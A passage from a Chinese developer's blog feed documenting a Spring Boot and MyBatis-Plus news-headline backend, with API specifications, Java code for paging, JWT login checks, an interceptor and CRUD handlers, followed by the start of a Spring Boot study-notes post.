发布时间已过小时数</span></span><br><span class="line"><span class="attr">&quot;publisher&quot;</span><span class="punctuation">:</span><span class="string">&quot;1&quot;</span> <span class="comment">// 发布用户ID</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br></pre></td></tr></table></figure>



<h5 id="实现-5"><a href="#实现-5" class="headerlink" title="实现"></a>实现</h5><p>对比数据库表和返回数据，发现返回数据需要记录已发布时长，而数据库表中无此字段。使用一个实体类构建返回数据：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PortalVo</span> &#123;</span><br><span class="line"><span class="keyword">private</span> String keyWords;</span><br><span class="line"><span class="keyword">private</span> Integer type;</span><br><span class="line"><span class="keyword">private</span> <span class="type">Integer</span> <span class="variable">pageNum</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="type">Integer</span> <span class="variable">pageSize</span> <span class="operator">=</span><span class="number">10</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分页查询需要自定义mapper方法和编写SQL语句：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">HeadlineMapper</span> <span class="keyword">extends</span> <span class="title class_">BaseMapper</span>&lt;Headline&gt; &#123;</span><br><span class="line">    IPage&lt;Map&gt; <span class="title function_">selectMyPage</span><span class="params">(IPage&lt;Headline&gt; page,<span class="meta">@Param(&quot;portalVo&quot;)</span> PortalVo portalVo)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;selectMyPage&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;map&quot;</span>&gt;</span></span><br><span class="line">    select hid,title,type,page_views</span><br><span class="line">    pageViews,TIMESTAMPDIFF(HOUR,create_time,NOW()) pastHours,</span><br><span class="line">    publisher from news_headline where is_deleted=0</span><br><span class="line">    <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;portalVo.keyWords !=null and portalVo.keyWords.length()&gt;0 &quot;</span>&gt;</span></span><br><span class="line">        and title like concat(&#x27;%&#x27;,#&#123;portalVo.keyWords&#125;,&#x27;%&#x27;)</span><br><span class="line">    <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;portalVo.type != null and portalVo.type !=0&quot;</span>&gt;</span></span><br><span class="line">        and type = #&#123;portalVo.type&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>service:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Result <span class="title function_">findNewPage</span><span class="params">(PortalVo portalVo)</span> &#123;</span><br><span class="line">        IPage&lt;Headline&gt; page = <span class="keyword">new</span> <span class="title class_">Page</span>&lt;&gt;(portalVo.getPageNum(),portalVo.getPageSize());</span><br><span class="line"></span><br><span class="line">        headlineMapper.selectMyPage(page,portalVo);</span><br><span class="line">        Map&lt;String,Object&gt; data = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        data.put(<span class="string">&quot;pageData&quot;</span>,page.getRecords());</span><br><span class="line">        data.put(<span class="string">&quot;pageNum&quot;</span>, page.getCurrent());</span><br><span class="line">        data.put(<span class="string">&quot;pageSize&quot;</span>,page.getSize());</span><br><span class="line">        data.put(<span class="string">&quot;totalPage&quot;</span>, page.getPages());</span><br><span class="line">        data.put(<span class="string">&quot;totalSize&quot;</span>, page.getTotal());</span><br><span class="line">        Map&lt;String,Object&gt; pageInfo = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        pageInfo.put(<span class="string">&quot;pageInfo&quot;</span>,data);</span><br><span class="line">        <span class="keyword">return</span> Result.ok(pageInfo);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>







<h4 id="首页详情查询"><a href="#首页详情查询" class="headerlink" title="首页详情查询"></a>首页详情查询</h4><p>用户点击”查看全文”时,向服务端发送新闻id<br>后端根据新闻id查询完整新闻文章信息并返回<br>后端要同时让新闻的浏览量+1</p>
<h5 id="接口文档-6"><a href="#接口文档-6" class="headerlink" title="接口文档"></a>接口文档</h5><p>url地址：portal&#x2F;showHeadlineDetail<br>请求方式：post<br>请求参数:</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">hid=<span class="number">1</span> param型参数</span><br></pre></td></tr></table></figure>

<p>响应数据：<br>成功</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="string">&quot;200&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;message&quot;</span><span class="punctuation">:</span><span class="string">&quot;success&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;data&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;headline&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;hid&quot;</span><span class="punctuation">:</span><span class="string">&quot;1&quot;</span><span class="punctuation">,</span> <span class="comment">// 新闻id</span></span><br><span class="line"><span class="attr">&quot;title&quot;</span><span class="punctuation">:</span><span class="string">&quot;马斯克宣布 ... ...&quot;</span><span class="punctuation">,</span> <span class="comment">// 新闻标题</span></span><br><span class="line"><span class="attr">&quot;article&quot;</span><span class="punctuation">:</span><span class="string">&quot;... ...&quot;</span> <span class="comment">// 新闻正文</span></span><br><span class="line"><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;1&quot;</span><span class="punctuation">,</span> <span class="comment">// 新闻所属类别编号</span></span><br><span class="line"><span class="attr">&quot;typeName&quot;</span><span class="punctuation">:</span><span class="string">&quot;科技&quot;</span><span class="punctuation">,</span> <span class="comment">// 新闻所属类别</span></span><br><span class="line"><span class="attr">&quot;pageViews&quot;</span><span class="punctuation">:</span><span class="string">&quot;40&quot;</span><span class="punctuation">,</span> <span class="comment">// 新闻浏览量</span></span><br><span class="line"><span class="attr">&quot;pastHours&quot;</span><span class="punctuation">:</span><span class="string">&quot;3&quot;</span> <span class="punctuation">,</span> <span class="comment">// 发布时间已过小时数</span></span><br><span class="line"><span class="attr">&quot;publisher&quot;</span><span class="punctuation">:</span><span class="string">&quot;1&quot;</span> <span class="punctuation">,</span> <span class="comment">// 发布用户ID</span></span><br><span class="line"><span class="attr">&quot;author&quot;</span><span class="punctuation">:</span><span class="string">&quot;张三&quot;</span> <span class="comment">// 新闻作者</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>



<h5 id="实现-6"><a href="#实现-6" class="headerlink" title="实现"></a>实现</h5><h3 id="头条模块开发"><a href="#头条模块开发" class="headerlink" title="头条模块开发"></a>头条模块开发</h3><h4 id="登录校验和保护"><a href="#登录校验和保护" class="headerlink" title="登录校验和保护"></a>登录校验和保护</h4><p>客户端在<strong>进入发布页前、发布新闻前、进入修改页前、修改前、删除新闻前</strong>先向服务端发送请求携带token请求头<br>后端接收token请求头后,校验用户登录是否过期并做响应<br>前端根据响应信息提示用户进入登录页还是进入正常业务页面</p>
<h5 id="接口文档-7"><a href="#接口文档-7" class="headerlink" title="接口文档"></a>接口文档</h5><p>url地址：user&#x2F;checkLogin<br>请求方式：get<br>请求参数: 无<br>请求头： token: 用户token<br>响应数据：<br>未过期：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="string">&quot;200&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;message&quot;</span><span class="punctuation">:</span><span class="string">&quot;success&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;data&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>过期：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="string">&quot;504&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;message&quot;</span><span class="punctuation">:</span><span class="string">&quot;loginExpired&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;data&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>



<h5 id="实现-7"><a href="#实现-7" class="headerlink" title="实现"></a>实现</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;checkLogin&quot;)</span></span><br><span class="line"><span class="keyword">public</span> Result <span class="title function_">checkLogin</span><span class="params">(<span class="meta">@RequestHeader</span> String token)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(jwtHelper.isExpiration(token))&#123;</span><br><span class="line">        <span class="keyword">return</span> Result.build(<span class="literal">null</span>, ResultCodeEnum.NOTLOGIN);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> Result.ok(<span class="literal">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>为实现登陆保护（即进行头条相关操作前需要验证是否登录），需要拦截器。</p>
<p>拦截器配置：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebMvcConfig</span> <span class="keyword">implements</span> <span class="title class_">WebMvcConfigurer</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> LoginProtectedInterceptor loginProtectedInterceptor;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addInterceptors</span><span class="params">(InterceptorRegistry registry)</span> &#123;</span><br><span class="line">        registry.addInterceptor(loginProtectedInterceptor).addPathPatterns(<span class="string">&quot;/headline/**&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>拦截器：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LoginProtectedInterceptor</span> <span class="keyword">implements</span> <span class="title class_">HandlerInterceptor</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> JwtHelper jwtHelper;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> request.getHeader(<span class="string">&quot;token&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(jwtHelper.isExpiration(token))&#123;</span><br><span class="line">            Result&lt;Object&gt; build = Result.build(<span class="literal">null</span>, ResultCodeEnum.NOTLOGIN);</span><br><span class="line">            response.getWriter().print(<span class="keyword">new</span> <span class="title class_">ObjectMapper</span>().writeValueAsString(build));</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h4 id="头条发布实现"><a href="#头条发布实现" class="headerlink" title="头条发布实现"></a>头条发布实现</h4><p>用户在客户端输入发布的新闻信息完毕后<br>发布前先请求后端的登录校验接口验证登录<br>登录通过则提交新闻信息<br>后端将新闻信息存入数据库</p>
<h5 id="接口文档-8"><a href="#接口文档-8" class="headerlink" title="接口文档"></a>接口文档</h5><p>url地址：headline&#x2F;publish<br>请求方式：post<br>请求头:</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">token<span class="punctuation">:</span> ... ...</span><br></pre></td></tr></table></figure>

<p>请求参数:</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;title&quot;</span><span class="punctuation">:</span><span class="string">&quot;尚硅谷宣布 ... ...&quot;</span><span class="punctuation">,</span> <span class="comment">// 文章标题</span></span><br><span class="line"><span class="attr">&quot;article&quot;</span><span class="punctuation">:</span><span class="string">&quot;... ...&quot;</span><span class="punctuation">,</span> <span class="comment">// 文章内容</span></span><br><span class="line"><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;1&quot;</span> <span class="comment">// 文章类别</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>响应数据：</p>
<p>未登录</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="string">&quot;504&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;message&quot;</span><span class="punctuation">:</span><span class="string">&quot;loginExpired&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;data&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>成功</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="string">&quot;200&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;message&quot;</span><span class="punctuation">:</span><span class="string">&quot;success&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;data&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>



<h5 id="实现-8"><a href="#实现-8" class="headerlink" title="实现"></a>实现</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> Result <span class="title function_">publish</span><span class="params">(Headline headline,String token)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">userId</span> <span class="operator">=</span> jwtHelper.getUserId(token).intValue();</span><br><span class="line">    headline.setPublisher(userId);</span><br><span class="line">    headline.setPageViews(<span class="number">0</span>);</span><br><span class="line">    headline.setCreateTime(<span class="keyword">new</span> <span class="title class_">Date</span>());</span><br><span class="line">    headline.setUpdateTime(<span class="keyword">new</span> <span class="title class_">Date</span>());</span><br><span class="line">    headlineMapper.insert(headline);</span><br><span class="line">    <span class="keyword">return</span> Result.ok(<span class="literal">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="修改头条回显"><a href="#修改头条回显" class="headerlink" title="修改头条回显"></a>修改头条回显</h4><p>前端先调用登录校验接口,校验登录是否过期<br>登录校验通过后 ,则根据新闻id查询新闻的完整信息并响应给前端</p>
<h5 id="接口文档-9"><a href="#接口文档-9" class="headerlink" title="接口文档"></a>接口文档</h5><p>url地址：headline&#x2F;findHeadlineByHid<br>请求方式：post<br>请求参数:</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">hid=<span class="number">1</span> param形成参数</span><br></pre></td></tr></table></figure>

<p>响应数据：<br>成功</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="string">&quot;200&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;message&quot;</span><span class="punctuation">:</span><span class="string">&quot;success&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;data&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;headline&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;hid&quot;</span><span class="punctuation">:</span><span class="string">&quot;1&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;title&quot;</span><span class="punctuation">:</span><span class="string">&quot;马斯克宣布&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;article&quot;</span><span class="punctuation">:</span><span class="string">&quot;... ... &quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;2&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>



<h5 id="实现-9"><a href="#实现-9" class="headerlink" title="实现"></a>实现</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@PostMapping(&quot;findHeadlineByHid&quot;)</span></span><br><span class="line"><span class="keyword">public</span> Result <span class="title function_">findHeadlineByHid</span><span class="params">(<span class="meta">@RequestParam(&quot;hid&quot;)</span> Integer hid)</span>&#123;</span><br><span class="line">   <span class="type">Headline</span> <span class="variable">headline</span> <span class="operator">=</span> headlineService.getById(hid);</span><br><span class="line">   Map&lt;String,Object&gt; data = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">   data.put(<span class="string">&quot;headline&quot;</span>,headline);</span><br><span class="line">   <span class="keyword">return</span> Result.ok(data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h4 id="头条修改实现"><a href="#头条修改实现" class="headerlink" title="头条修改实现"></a>头条修改实现</h4><p>客户端将新闻信息修改后,提交前先请求登录校验接口校验登录状态<br>登录校验通过则提交修改后的新闻信息,后端接收并更新进入数据库</p>
<h5 id="接口文档-10"><a href="#接口文档-10" class="headerlink" title="接口文档"></a>接口文档</h5><p>url地址：headline&#x2F;update<br>请求方式：post<br>请求参数:</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;hid&quot;</span><span class="punctuation">:</span><span class="string">&quot;1&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;title&quot;</span><span class="punctuation">:</span><span class="string">&quot;尚硅谷宣布 ... ...&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;article&quot;</span><span class="punctuation">:</span><span class="string">&quot;... ...&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;2&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>响应数据：<br>成功</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="string">&quot;200&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;message&quot;</span><span class="punctuation">:</span><span class="string">&quot;success&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;data&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>



<h5 id="实现-10"><a href="#实现-10" class="headerlink" title="实现"></a>实现</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> Result <span class="title function_">updateUseId</span><span class="params">(Headline headline)</span> &#123;</span><br><span class="line">    <span class="type">Integer</span> <span class="variable">version</span> <span class="operator">=</span> headlineMapper.selectById(headline.getHid()).getVersion();</span><br><span class="line">    headline.setVersion(version);<span class="comment">// 乐观锁</span></span><br><span class="line">    headline.setUpdateTime(<span class="keyword">new</span> <span class="title class_">Date</span>());</span><br><span class="line">    headlineMapper.updateById(headline);</span><br><span class="line">    <span class="keyword">return</span> Result.ok(<span class="literal">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="删除头条实现"><a href="#删除头条实现" class="headerlink" title="删除头条实现"></a>删除头条实现</h4><p>将要删除的新闻id发送给服务端<br>服务端校验登录是否过期,未过期则直接删除,过期则响应登录过期信息</p>
<h5 id="接口文档-11"><a href="#接口文档-11" class="headerlink" title="接口文档"></a>接口文档</h5><p>url地址：headline&#x2F;removeByHid<br>请求方式：post<br>请求参数:</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">hid=<span class="number">1</span> param形成参数</span><br></pre></td></tr></table></figure>

<p>成功</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="string">&quot;200&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;message&quot;</span><span class="punctuation">:</span><span class="string">&quot;success&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;data&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>



<h5 id="实现-11"><a href="#实现-11" class="headerlink" title="实现"></a>实现</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@PostMapping(&quot;removeByHid&quot;)</span></span><br><span class="line"><span class="keyword">public</span> Result <span class="title function_">removeByHid</span><span class="params">(<span class="meta">@RequestParam(&quot;hid&quot;)</span> Integer hid)</span>&#123;</span><br><span class="line">   headlineService.removeById(hid);</span><br><span class="line">   <span class="keyword">return</span> Result.ok(<span class="literal">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h3 id="项目框架"><a href="#项目框架" class="headerlink" title="项目框架"></a>项目框架</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">my-backend-project/</span><br><span class="line">├── src/</span><br><span class="line">│   ├── main/</span><br><span class="line">│   │   ├── java/              # Java 源代码</span><br><span class="line">│   │   │   └── com/</span><br><span class="line">│   │   │       └── fu/</span><br><span class="line">│   │   │           └── MicroHeadline/</span><br><span class="line">│   │   │               ├── MyProjectApplication.java     # 主应用程序启动类</span><br><span class="line">│   │   │               ├── config/                       # 配置类</span><br><span class="line">│   │   │               ├── controller/                   # 控制器类</span><br><span class="line">│   │   │               ├── dto（这个没有）/                # 数据传输对象</span><br><span class="line">│   │   │               ├── entity(pojo)/                 # 实体类（数据库映射）</span><br><span class="line">│   │   │               ├── exception（这个没有）/          # 自定义异常类</span><br><span class="line">│   │   │               ├── repository(mapper)/           # 数据库访问接口</span><br><span class="line">│   │   │               ├── service/                      # 业务逻辑层</span><br><span class="line">│   │   │               │   └── impl/                     # 服务实现类</span><br><span class="line">│   │   │               └── util/                         # 工具类</span><br><span class="line">│   │   └── resources/                                    # 资源文件</span><br><span class="line">│   │       ├── application.properties                   # 应用配置文件</span><br><span class="line">│   │       ├── static（这个没有）/                        # 静态资源（如 CSS, JS 文件）</span><br><span class="line">│   │       ├── templates（这个没有）/                     # 视图模板（如 Thymeleaf, FreeMarker）</span><br><span class="line">│   │       └── messages（这个没有）/                      # 国际化消息文件</span><br><span class="line">├── src/</span><br><span class="line">│   └── test/</span><br><span class="line">│       ├── java/                                         # 测试代码</span><br><span class="line">│       │   └── com/</span><br><span class="line">│       │       └── fu/</span><br><span class="line">│       │           └── MicroHeadline/</span><br><span class="line">│       │               ├── MyProjectApplicationTests.java # 单元测试类</span><br><span class="line">│       └── resources/                                    # 测试资源文件</span><br><span class="line">├── .gitignore                                            # Git 忽略文件</span><br><span class="line">├── pom.xml                                               # Maven 构建文件（对于 Gradle 项目则是 build.gradle）</span><br><span class="line">└── README.md                                             # 项目说明文档</span><br></pre></td></tr></table></figure>





<h3 id="难点问题"><a href="#难点问题" class="headerlink" title="难点问题"></a>难点问题</h3><p>1、调用<code>userMapper.selectById()</code>方法时，User实体类必须有被<code>@TableId</code>表明为主键字段的属性。</p>
<p>2、一定要注意请求参数的位置和格式，如<code>getUserInfo</code>的请求参数是在请求头中，需要<code>@RequestHeader</code>注解</p>
<p>3、分页查询需要自定义mapper方法和编写SQL语句</p>
<p>4、GetMapper(“path”)访问路径一定要写对！！！</p>
<p>5、拦截器使用不熟练</p>
<p>6、JavaScript中的<code>&amp;&amp;</code>是短路与，当前面是表达式且表达式为<code>false</code>时，不再执行后面的语句。因此日程管理项目中，前端页面表单提交时判断密码和用户名格式不能直接使用<code>checkUsername()&amp;&amp;checkUserPwd()</code>;</p>
<p>7、lombok插件使用时应当在设置&#x3D;》构建，执行和部署&#x3D;》注解处理器中<code>启用注解支持</code></p>
<h3 id="常见错误"><a href="#常见错误" class="headerlink" title="常见错误"></a>常见错误</h3><h2 id="代码规范"><a href="#代码规范" class="headerlink" title="代码规范"></a>代码规范</h2><h3 id="实体类设计"><a href="#实体类设计" class="headerlink" title="实体类设计"></a>实体类设计</h3><p>实体类设计应当满足以下要求</p>
<ul>
<li>实体类类名和数据库表名应当一致（驼峰对应下划线）</li>
<li>实体类属性应当和数据库表的列名一致（驼峰对应下划线）</li>
<li>实体类的每个属性应当具备对应的getter\setter方法，应当都是私有的</li>
<li>实体类应当具备一个无参构造器。</li>
<li>实体类应当实现序列化接口（缓存、分布式项目的数据传递需要将对象序列化）。</li>
<li>应当重写实体类的hashcode 和equal方法</li>
</ul>
<h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
      <categories>
        <category>Java</category>
        <category>项目实践</category>
      </categories>
      <tags>
        <tag>微头条</tag>
      </tags>
  </entry>
  <entry>
    <title>Java-SSM-SpringBoot</title>
    <url>/2025/01/30/Java-SSM-SpringBoot/</url>
    <content><![CDATA[<h2 id="笔记说明"><a href="#笔记说明" class="headerlink" title="笔记说明"></a>笔记说明</h2><h3 id="笔记平台"><a href="#笔记平台" class="headerlink" title="笔记平台"></a>笔记平台</h3><p>（1）IDEA开发工具：2022.1.2<br>（2）JDK：Java17<strong>（Spring6要求JDK最低版本是Java17）</strong><br>（3）Spring：6.0.2</p>
<p>（4）Maven：3.6.3+</p>
<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><strong>主要参考资料：</strong></p>
<p><a href="https://docs.spring.io/spring-boot/index.html">SpringBoot官方教程</a></p>
<p><a href="https://www.bilibili.com/video/BV1AP411s7D7/?spm_id_from=333.788.player.switch&vd_source=20530c92c1be8bd70e37346e3a5c037a&p=140">SpringBoot3教程</a></p>
<p><strong>其他参考资料：</strong></p>
<p><a href="https://www.bilibili.com/video/BV1AP411s7D7/?spm_id_from=333.1387.search.video_card.click&vd_source=20530c92c1be8bd70e37346e3a5c037a">尚硅谷新版SSM框架全套视频教程，Spring6+SpringBoot3最新SSM企业级开发_哔哩哔哩_bilibili</a></p>
<p><a href="https://www.bilibili.com/video/BV1Ya411S7aT/?spm_id_from=333.1387.search.video_card.click">【尚硅谷】SSM框架全套教程，MyBatis+Spring+SpringMVC+SSM整合一套通关</a></p>
<p><a href="https://www.bilibili.com/video/BV1sC4y1K7ET/?spm_id_from=333.1387.search.video_card.click">尚硅谷<em>SpringBoot</em>响应式编程教程，最新<em>springboot</em>3入门到实战</a></p>
<p><a href="https://www.bilibili.com/video/BV1Es4y1q7Bf/?spm_id_from=333.1387.search.video_card.click">尚硅谷<em>SpringBoot</em>零基础教程，面试&amp;加薪必会<em>springboot</em>3</a></p>
<p><a href="https://www.bilibili.com/video/BV19K4y1L7MT/?spm_id_from=333.1387.search.video_card.click">【尚硅谷】<em>SpringBoot</em>2零基础入门教程（spring boot2干货满满）</a></p>
<p><a href="https://www.bilibili.com/video/BV1KW411F7oX/?spm_id_from=333.1387.search.video_card.click">尚硅谷<em>SpringBoot</em>整合教程(<em>springboot</em>框架实战)</a></p>
<p><a href="https://www.bilibili.com/video/BV1gW411W76m/?spm_id_from=333.1387.search.video_card.click">尚硅谷<em>SpringBoot</em>顶尖教程(<em>springboot</em>之idea版spring boot)</a></p>
<h1 id="使用教程"><a href="#使用教程" class="headerlink" title="使用教程"></a>使用教程</h1><h2 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h2><h3 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h3><p><strong>Spring Boot</strong> 是一个基于Spring框架的开源Java库，旨在简化新Spring应用的初始搭建以及开发过程。它通过提供默认配置和<strong>约定大于配置</strong>的原则，让开发者能够快速上马项目，减少样板式代码。</p>
<ul>
<li><p><strong>功能</strong>：</p>
<ul>
